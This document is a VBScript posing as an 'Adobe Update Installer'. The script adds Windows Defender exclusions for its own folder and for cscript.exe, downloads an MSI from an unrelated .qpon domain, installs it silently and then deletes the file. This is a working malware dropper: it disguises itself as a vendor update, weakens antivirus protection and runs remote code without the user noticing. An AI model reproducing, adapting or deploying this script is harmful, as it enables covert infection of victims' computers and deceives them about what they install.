' Adobe Update Installer
' VBScript equivalent of the batch script for downloading and installing MSI

Dim objShell, objFSO, objXMLHTTP, objStream
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Configuration
Dim downloadUrl
downloadUrl = "https://wcgainconnectportal.qpon/downloadServer.php"

' Set window title (for console if run via cscript)
objShell.Run "cmd /c title adobeupdateinstaller", 0, True

' Auto-elevate to admin (if not already)
If Not IsAdmin() Then
    objShell.Run "cscript.exe """ & WScript.ScriptFullName & """", 0, True
    WScript.Quit
End If

' Add Defender exclusions (requires admin)
On Error Resume Next
objShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath '" & objFSO.GetParentFolderName(WScript.ScriptFullName) & "'""", 0, True
objShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'cscript.exe'""", 0, True
On Error GoTo 0

' Download the MSI
Dim tempFolder, msiPath, logPath
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
msiPath = tempFolder & "\adobeupdateinstaller.msi"
logPath = tempFolder & "\adobe_install_log.txt"

WScript.Echo "Downloading Adobe Update Installer..."
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.Open "GET", downloadUrl, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objXMLHTTP.ResponseBody
    objStream.SaveToFile msiPath, 2 ' Overwrite
    objStream.Close
    WScript.Echo "Download complete."
Else
    WScript.Echo "Download failed with status: " & objXMLHTTP.Status
    WScript.Quit 1
End If

' Install the MSI silently
WScript.Echo "Installing Adobe Update Installer..."
Dim installCmd
installCmd = "msiexec.exe /i """ & msiPath & """ /quiet /norestart /L*v """ & logPath & """"
Dim exitCode
exitCode = objShell.Run(installCmd, 0, True)

If exitCode = 0 Then
    WScript.Echo "Installation complete."
Else
    WScript.Echo "Installation failed with exit code: " & exitCode
End If

' Cleanup
If objFSO.FileExists(msiPath) Then objFSO.DeleteFile msiPath

' Exit with install exit code
WScript.Quit exitCode

Function IsAdmin()
    On Error Resume Next
    objShell.RegRead "HKEY_USERS\S-1-5-19\Environment\TEMP"
    If Err.Number = 0 Then
        IsAdmin = True
    Else
        IsAdmin = False
    End If
    On Error GoTo 0
End Function